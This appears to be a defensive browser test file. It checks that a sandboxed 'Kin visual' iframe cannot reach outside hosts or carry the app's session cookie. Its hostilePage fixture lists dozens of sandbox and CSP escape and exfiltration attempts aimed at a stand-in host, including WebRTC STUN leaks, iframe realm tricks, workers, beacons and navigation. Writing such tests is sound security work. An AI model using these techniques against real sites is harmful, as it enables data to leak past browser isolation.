// @effect-diagnostics nodeBuiltinImport:off
import * as NodeDgram from "node:dgram";
import * as NodeFS from "node:fs";
import * as NodeHttp from "node:http";
import * as NodeNet from "node:net";
import * as NodeOS from "node:os";
import * as NodePath from "node:path";

import { assert, it } from "@effect/vitest";
import * as HostProcess from "@t3tools/shared/HostProcess";
import {
  KIN_VISUAL_LIBRARIES,
  KIN_VISUAL_OUTER_DOCUMENT,
  kinVisualContentSecurityPolicy,
  kinVisualPageDocument,
} from "@t3tools/shared/kinVisual";
import * as Deferred from "effect/Deferred";
import * as Effect from "effect/Effect";
import { chromium, type Browser } from "playwright-core";

const TEST_BROWSER_ENV = "T3CODE_TEST_HEADLESS_SHELL";
// What T3 sends with a coding thread's page, which leaves the network open: the control.
const OPEN_POLICY = "sandbox allow-scripts allow-forms allow-popups allow-downloads";
// Every outside name the page uses ends here; the browser maps them all to the TCP canary.
const OUTSIDE = "leak.canary";

/**
 * Every way out a page has. `stun` is a UDP canary, `http` the TCP one under an outside name.
 * Each attempt that could open a second realm runs the same STUN call there.
 */
const hostilePage = (stun: string) => {
  const http = `http://${OUTSIDE}`;
  const rtc = `try{var pc=new RTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]});(window.held=window.held||[]).push(pc);pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)})}catch(e){}`;
  const child = `<script>${rtc}<\\/script>`;
  const childAttr = child
    .replace(/&/g, "&amp;")
    .replace(/"/g, "&quot;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
  return `<!doctype html><html><head>
<meta http-equiv="refresh" content="3;url=${http}/meta-refresh">
<link rel="preconnect" href="${http}"><link rel="dns-prefetch" href="${http}">
<link rel="stylesheet" href="${http}/stylesheet">
<link rel="prefetch" href="${http}/prefetch">
<link rel="preload" as="image" href="${http}/preload">
<link rel="modulepreload" href="${http}/modulepreload">
<script type="speculationrules">{"prefetch":[{"source":"list","urls":["${http}/speculation"]}],"prerender":[{"source":"list","urls":["${http}/prerender"]}]}</script>
<script src="${http}/script"></script>
<style>@import url("${http}/css-import");@font-face{font-family:x;src:url("${http}/font")}body{font-family:x;background:url("${http}/css-image")}</style>
</head><body>
<img src="${http}/img"><video src="${http}/video"></video><audio src="${http}/audio"></audio>
<iframe src="${http}/iframe"></iframe><iframe srcdoc="${childAttr}"></iframe>
<object data="${http}/object"></object><embed src="${http}/embed">
<a id="link" href="${http}/link-click" ping="${http}/ping">x</a>
<form id="form" action="${http}/form" method="post"><input name="a" value="b"></form>
<script>
var child = ${JSON.stringify(child)};
var attempts = [
  function () { ${rtc} },
  function () { new webkitRTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var C = Function("return RTCPeerConnection")(); new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var C = (0, eval)("window.RTCPeerConnection"); new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { delete window.RTCPeerConnection; new RTCPeerConnection({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { navigator.mediaDevices.getUserMedia({ audio: true }); },
  function () { var f = document.createElement("iframe"); f.srcdoc = child; document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.setAttribute("srcdoc", child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.setAttribute({ toString: function () { return "srcdoc"; } }, child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); var a = document.createAttribute("srcdoc"); a.value = child; f.setAttributeNode(a); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); document.body.appendChild(f); f.setAttribute("srcdoc", child); },
  function () { var f = document.createElement("iframe"); f.src = "javascript:'" + child.replace(/'/g, "\\\\'") + "'"; document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.src = "data:text/html," + encodeURIComponent(child); document.body.appendChild(f); },
  function () { var f = document.createElement("iframe"); f.src = URL.createObjectURL(new Blob([child], { type: "text/html" })); document.body.appendChild(f); },
  function () { var d = document.createElement("div"); d.innerHTML = '<iframe srcdoc="${childAttr}"></iframe>'; document.body.appendChild(d); },
  function () { document.body.insertAdjacentHTML("beforeend", '<iframe srcdoc="${childAttr}"></iframe>'); },
  function () { var t = document.createElement("template"); t.innerHTML = '<iframe srcdoc="${childAttr}"></iframe>'; document.body.appendChild(t.content.cloneNode(true)); },
  function () { var x = new DOMParser().parseFromString('<html xmlns="http://www.w3.org/1999/xhtml"><body><iframe srcdoc="${childAttr}"/></body></html>', "application/xhtml+xml"); document.body.appendChild(document.adoptNode(x.getElementsByTagName("iframe")[0])); },
  function () { var f = document.createElement("iframe"); document.body.appendChild(f); var C = f.contentWindow.RTCPeerConnection; new C({iceServers:[{urls:"stun:${stun}"}]}); },
  function () { var o = document.createElement("object"); o.data = "data:text/html," + encodeURIComponent(child); document.body.appendChild(o); },
  function () { new Worker(URL.createObjectURL(new Blob(["fetch('${http}/blob-worker')"], { type: "text/javascript" }))); },
  function () { new Worker("data:text/javascript,fetch('${http}/data-worker')"); },
  function () { new SharedWorker(URL.createObjectURL(new Blob(["fetch('${http}/shared-worker')"], { type: "text/javascript" }))); },
  function () { CSS.paintWorklet.addModule("data:text/javascript,0"); },
  function () { new AudioContext().audioWorklet.addModule(URL.createObjectURL(new Blob(["0"], { type: "text/javascript" }))); },
  function () { fetch("${http}/fetch", { mode: "no-cors" }).catch(function () {}); },
  function () { var x = new XMLHttpRequest(); x.open("GET", "${http}/xhr"); x.send(); },
  function () { new WebSocket("ws://${OUTSIDE}/websocket"); },
  function () { new WebTransport("https://${OUTSIDE}:4433/webtransport"); },
  function () { navigator.sendBeacon("${http}/beacon", "x"); },
  function () { new EventSource("${http}/event-source"); },
  function () { import("${http}/dynamic-import").catch(function () {}); },
  function () { window.open("${http}/window-open"); },
  function () { window.top.location = "${http}/top-navigation"; },
  function () { window.parent.location = "${http}/parent-navigation"; },
  function () { var s = document.createElement("script"); s.src = "${http}/script-dynamic"; document.head.appendChild(s); },
  function () { var l = document.createElement("link"); l.rel = "preconnect"; l.href = "${http}"; document.head.appendChild(l); },
  function () { var l = document.createElement("link"); l.rel = "prefetch"; l.href = "${http}/prefetch-dynamic"; document.head.appendChild(l); },
  function () { var b = document.createElement("base"); b.href = "${http}/"; document.head.appendChild(b); new Image().src = "base-relative"; },
];
attempts.forEach(function (attempt) { try { attempt(); } catch (error) {} });
// The page reached its last line and still loads from its own host.
new Image().src = new URL("/attempted", location.href).href;
// Navigating ends the page, so these go last, once STUN has had its chance in the control.
setTimeout(function () {
  try { document.getElementById("form").submit(); } catch (error) {}
  try { document.getElementById("link").click(); } catch (error) {}
  location.href = "${http}/self-navigation";
}, 2500);
</script></body></html>`;
};

interface Canaries {
  readonly stun: string;
  readonly tcpPort: number;
  /** What reached the canaries: `udp` packets and `tcp` connections. */
  readonly reached: Array<string>;
  readonly udp: Deferred.Deferred<void>;
  readonly tcp: Deferred.Deferred<void>;
}

const canaries = Effect.acquireRelease(
  Effect.callback<Canaries & { readonly close: () => void }>((resume) => {
    const reached: Array<string> = [];
    const seen = { udp: Deferred.makeUnsafe<void>(), tcp: Deferred.makeUnsafe<void>() };
    const hit = (kind: "udp" | "tcp") => {
      reached.push(kind);
      Deferred.doneUnsafe(seen[kind], Effect.void);
    };
    const udp = NodeDgram.createSocket("udp4");
    udp.on("message", () => hit("udp"));
    const tcp = NodeNet.createServer((socket) => {
      hit("tcp");
      socket.on("error", () => {});
      socket.destroy();
    });
    udp.bind(0, "127.0.0.1", () => {
      tcp.listen(0, "127.0.0.1", () => {
        resume(
          Effect.succeed({
            stun: `127.0.0.1:${udp.address().port}`,
            tcpPort: (tcp.address() as NodeNet.AddressInfo).port,
            reached,
            ...seen,
            close: () => {
              udp.close();
              tcp.close();
            },
          }),
        );
      });
    });
  }),
  ({ close }) => Effect.sync(close),
);

/** Serves the visual as the asset route does: the page only to a frame's own request. */
const visualHost = (page: string, sealed: boolean, attempted: Deferred.Deferred<void>) =>
  Effect.acquireRelease(
    Effect.callback<{ readonly origin: string; readonly server: NodeHttp.Server }>((resume) => {
      const server = NodeHttp.createServer((request, response) => {
        const url = new URL(request.url ?? "/", "http://kin.test");
        if (url.pathname === "/attempted") Deferred.doneUnsafe(attempted, Effect.void);
        if (url.pathname !== "/visual") {
          response.writeHead(200, { "content-type": "image/gif" }).end();
          return;
        }
        const inner =
          url.searchParams.has("frame") && request.headers["sec-fetch-dest"] === "iframe";
        response
          .writeHead(200, {
            "content-type": "text/html; charset=utf-8",
            "content-security-policy": sealed
              ? kinVisualContentSecurityPolicy(inner ? "page" : "outer")
              : OPEN_POLICY,
          })
          .end(inner ? page : KIN_VISUAL_OUTER_DOCUMENT);
      });
      server.listen(0, "127.0.0.1", () => {
        const { port } = server.address() as NodeNet.AddressInfo;
        resume(Effect.succeed({ origin: `http://127.0.0.1:${port}`, server }));
      });
    }),
    ({ server }) =>
      Effect.sync(() => {
        server.closeAllConnections();
        server.close();
      }),
  );

const launch = (executable: string, tcpPort: number, netLog: string) =>
  Effect.acquireRelease(
    Effect.promise(() =>
      chromium.launch({
        executablePath: executable,
        headless: true,
        args: [
          `--host-resolver-rules=MAP *.canary 127.0.0.1:${tcpPort}`,
          `--log-net-log=${netLog}`,
          "--net-log-capture-mode=Everything",
        ],
      }),
    ),
    (browser: Browser) => Effect.promise(() => browser.close()),
  );

/** Opens the hostile visual and resolves once its page has run every attempt. */
const openVisual = Effect.fn("test.openVisual")(function* (
  executable: string,
  sealed: boolean,
  directory: string,
) {
  const canary = yield* canaries;
  const attempted = yield* Deferred.make<void>();
  // The control is the raw page, as a coding thread serves it: no prelude, no Kin policy.
  const page = hostilePage(canary.stun);
  const host = yield* visualHost(sealed ? kinVisualPageDocument(page) : page, sealed, attempted);
  const netLog = NodePath.join(directory, `${sealed ? "sealed" : "open"}.json`);
  const browser = yield* launch(executable, canary.tcpPort, netLog);
  const tab = yield* Effect.promise(() => browser.newPage());
  yield* Effect.promise(() => tab.goto(`${host.origin}/visual`));
  yield* Deferred.await(attempted);
  return { canary, browser, netLog, page: tab };
});

it.live("a hostile page in a Kin visual reaches nothing off its own host", (ctx) =>
  Effect.gen(function* () {
    const executable = (yield* HostProcess.Environment)[TEST_BROWSER_ENV];
    if (!executable) return ctx.skip(`Set ${TEST_BROWSER_ENV} to run this test.`);
    const directory = NodeFS.mkdtempSync(NodePath.join(NodeOS.tmpdir(), "kin-visual-seal-"));
    yield* Effect.addFinalizer(() =>
      Effect.sync(() => NodeFS.rmSync(directory, { recursive: true, force: true })),
    );

    // The sealed page runs first. Then the same page under T3's open policy: its exits reaching
    // the canaries mark the time by which the sealed page's would have arrived too.
    const sealed = yield* openVisual(executable, true, directory);
    const open = yield* openVisual(executable, false, directory);
    // STUN and a socket both reach the open canary, so silence below is not a blind canary.
    yield* Deferred.await(open.canary.udp);
    yield* Deferred.await(open.canary.tcp);

    // The sealed frame's top document is still the outer one: nothing navigated it away.
    const outer = yield* Effect.promise(() => sealed.page.content());
    assert.include(outer, "<iframe");
    assert.notInclude(outer, "hostile");
    yield* Effect.promise(() => sealed.browser.close());
    yield* Effect.promise(() => open.browser.close());

    assert.deepStrictEqual(sealed.canary.reached, []);
    // The browser's own resolver log: the sealed page never even looked an outside name up.
    assert.notInclude(NodeFS.readFileSync(sealed.netLog, "utf8"), OUTSIDE);
    assert.include(NodeFS.readFileSync(open.netLog, "utf8"), OUTSIDE);
  }).pipe(Effect.scoped),
);

it.live("the three libraries still draw inside the seal", (ctx) =>
  Effect.gen(function* () {
    const executable = (yield* HostProcess.Environment)[TEST_BROWSER_ENV];
    if (!executable) return ctx.skip(`Set ${TEST_BROWSER_ENV} to run this test.`);
    const files = Object.fromEntries(
      KIN_VISUAL_LIBRARIES.map((library) => {
        const entry = import.meta.resolve(library.name);
        const marker = `/node_modules/${library.name}/`;
        const root = new URL(entry).pathname;
        return [
          `/lib/${library.name}.js`,
          NodeFS.readFileSync(
            root.slice(0, root.lastIndexOf(marker) + marker.length) + library.file,
          ),
        ];
      }),
    );
    const drawn = yield* Deferred.make<string>();
    const page = `<!doctype html><html><head>${KIN_VISUAL_LIBRARIES.map((library) => `<script src="/lib/${library.name}.js"></script>`).join("")}</head><body>
<div id="c" style="height:200px"></div><pre class="mermaid">flowchart LR; A-->B</pre><svg id="s"></svg>
<script>
kin.echarts("#c", { series: [{ type: "treemap", data: [{ name: "a", value: 3 }, { name: "b", value: 5 }] }] });
d3.select("#s").selectAll("circle").data([1, 2, 3]).join("circle").attr("r", 4);
kin.mermaid().then(function () {
  var report = [!!document.querySelector("#c canvas"), document.querySelectorAll("#s circle").length, !!document.querySelector(".mermaid svg")].join(",");
  new Image().src = "/drawn?" + report;
});
</script></body></html>`;
    const server = NodeHttp.createServer((request, response) => {
      const url = new URL(request.url ?? "/", "http://kin.test");
      if (url.pathname === "/drawn") Deferred.doneUnsafe(drawn, Effect.succeed(url.search));
      const file = files[url.pathname];
      if (file !== undefined) {
        response.writeHead(200, { "content-type": "text/javascript" }).end(file);
        return;
      }
      if (url.pathname !== "/visual") {
        response.writeHead(204).end();
        return;
      }
      const inner = url.searchParams.has("frame") && request.headers["sec-fetch-dest"] === "iframe";
      response
        .writeHead(200, {
          "content-type": "text/html; charset=utf-8",
          "content-security-policy": kinVisualContentSecurityPolicy(inner ? "page" : "outer"),
        })
        .end(inner ? kinVisualPageDocument(page) : KIN_VISUAL_OUTER_DOCUMENT);
    });
    yield* Effect.acquireRelease(
      Effect.callback<void>((resume) => {
        server.listen(0, "127.0.0.1", () => resume(Effect.void));
      }),
      () =>
        Effect.sync(() => {
          server.close();
        }),
    );
    const { port } = server.address() as NodeNet.AddressInfo;
    const browser = yield* Effect.acquireRelease(
      Effect.promise(() => chromium.launch({ executablePath: executable, headless: true })),
      (opened) => Effect.promise(() => opened.close()),
    );
    const tab = yield* Effect.promise(() => browser.newPage());
    yield* Effect.promise(() => tab.goto(`http://127.0.0.1:${port}/visual`));
    assert.strictEqual(yield* Deferred.await(drawn), "?true,3,true");
  }).pipe(Effect.scoped),
);

it.live("no cookie of the app's rides along on what the page loads from Kin", (ctx) =>
  Effect.gen(function* () {
    const executable = (yield* HostProcess.Environment)[TEST_BROWSER_ENV];
    if (!executable) return ctx.skip(`Set ${TEST_BROWSER_ENV} to run this test.`);
    const cookies: Record<string, string | undefined> = {};
    const loaded = { app: yield* Deferred.make<void>(), page: yield* Deferred.make<void>() };
    const page = `<!doctype html><html><head><script src="/page-script"></script></head><body><img src="/page-image"><script>new Image().src = "/page-last";</script></body></html>`;
    const server = NodeHttp.createServer((request, response) => {
      const url = new URL(request.url ?? "/", "http://kin.test");
      cookies[url.pathname] = request.headers.cookie;
      if (url.pathname === "/app") {
        // The session cookie T3 sets, and the frame the web client puts a visual in.
        response
          .writeHead(200, {
            "content-type": "text/html",
            "set-cookie": "t3_session=secret; Path=/; HttpOnly; SameSite=Lax",
          })
          .end(
            `<!doctype html><script>new Image().src = "/app-image";</script><iframe sandbox="allow-scripts allow-downloads" src="/visual"></iframe>`,
          );
        return;
      }
      if (url.pathname === "/app-image") Deferred.doneUnsafe(loaded.app, Effect.void);
      if (url.pathname === "/page-last") Deferred.doneUnsafe(loaded.page, Effect.void);
      if (url.pathname !== "/visual") {
        response.writeHead(200, { "content-type": "text/javascript" }).end("");
        return;
      }
      const inner = url.searchParams.has("frame") && request.headers["sec-fetch-dest"] === "iframe";
      response
        .writeHead(200, {
          "content-type": "text/html; charset=utf-8",
          "content-security-policy": kinVisualContentSecurityPolicy(inner ? "page" : "outer"),
        })
        .end(inner ? kinVisualPageDocument(page) : KIN_VISUAL_OUTER_DOCUMENT);
    });
    yield* Effect.acquireRelease(
      Effect.callback<void>((resume) => {
        server.listen(0, "127.0.0.1", () => resume(Effect.void));
      }),
      () =>
        Effect.sync(() => {
          server.close();
        }),
    );
    const { port } = server.address() as NodeNet.AddressInfo;
    const browser = yield* Effect.acquireRelease(
      Effect.promise(() => chromium.launch({ executablePath: executable, headless: true })),
      (opened) => Effect.promise(() => opened.close()),
    );
    const tab = yield* Effect.promise(() => browser.newPage());
    yield* Effect.promise(() => tab.goto(`http://127.0.0.1:${port}/app`));
    yield* Deferred.await(loaded.app);
    yield* Deferred.await(loaded.page);
    // The control: the app's own request carries the session.
    assert.strictEqual(cookies["/app-image"], "t3_session=secret");
    for (const path of ["/visual", "/page-script", "/page-image", "/page-last"])
      assert.isUndefined(cookies[path], path);
  }).pipe(Effect.scoped),
);
